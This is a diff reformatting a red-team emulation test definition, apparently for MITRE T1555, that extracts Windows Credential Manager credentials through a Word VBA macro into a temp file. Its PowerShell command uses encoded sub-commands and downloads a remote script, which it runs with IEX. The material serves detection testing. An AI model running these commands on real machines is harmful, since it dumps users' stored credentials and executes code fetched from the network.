@@ -1,24 +1,19 @@
-- id: b9360615-e45d-586a-bb8b-ba6cef91fd6b
+- requirements: []
   name: Soumaia ART Tests - Extract Windows Credential Manager via VBA
   description: 'This module will extract the credentials found within the Windows credential manager and dump
 
     them to $env:TEMP\windows-credentials.txt'
   tactic: credential-access
-  technique:
-    attack_id: T1555
-    name: Credentials from Password Stores
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgB3AG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAHcAaQBuAHcAbwByAGQAIgAKACAAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACQAcAByAG8AYwBlAHMAcwAKACAAIABlAHgAaQB0ACAAMAAKAH0AIABjAGEAdABjAGgAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
-          }
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-          Invoke-Maldoc -macroFile ".\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
-        cleanup: |-
-          Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
-        payloads:
-        - T1555-macrocode.txt
+  technique_id: T1555
+  technique_name: Credentials from Password Stores
+  executors:
+  - cleanup:
+    - Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - T1555-macrocode.txt
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgB3AG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAHcAaQBuAHcAbwByAGQAIgAKACAAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACQAcAByAG8AYwBlAHMAcwAKACAAIABlAHgAaQB0ACAAMAAKAH0AIABjAGEAdABjAGgAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA }; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing); Invoke-Maldoc -macroFile ".\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
+  id: b9360615-e45d-586a-bb8b-ba6cef91fd6b
